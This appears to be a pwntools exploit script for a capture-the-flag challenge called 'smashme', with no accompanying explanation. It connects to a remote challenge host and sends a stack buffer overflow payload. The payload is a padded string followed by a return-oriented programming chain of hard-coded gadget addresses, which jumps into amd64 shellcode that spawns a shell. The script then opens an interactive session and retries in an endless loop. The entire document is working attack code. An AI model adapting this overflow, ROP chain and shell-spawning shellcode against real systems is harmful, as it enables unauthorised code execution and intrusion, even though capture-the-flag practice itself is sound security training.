from pwn import *

while 1:
	try:
		#s = process("./smashme")
		s = remote("smashme_omgbabysfirst.quals.shallweplayaga.me", 57348)

		s.recvuntil("smash?")

		buf = "Smash me outside, how bout dAAAAAAAAAAA"
		buf += cyclic(33)

		p = ''

		p += p64(0x4c3b28) #7810 0x00000000004c3b28 : pop rax ; ret
		p += p64(0x7ffc9f5ee328)

		p += p64(0x41ffaa) #6107 0x000000000041ffaa : mov eax, esp ; pop rbx ; pop rbp ; pop r12 ; ret

		p += "A"*8*3

		p += p64(0x4015f6) #7799 0x00000000004015f6 : pop r14 ; ret
		p += p64(0x7ffe00000030)

		p += p64(0x49b03d) #2617 0x000000000049b03d : add rax, r14 ; jmp rax
		#2618 0x000000000049aab5 : add rax, r8 ; jmp rax

		p += asm(shellcraft.amd64.sh(), arch="amd64",os="linux")

		buf += p

		s.sendline(buf)

		s.interactive()
	except:
		pass
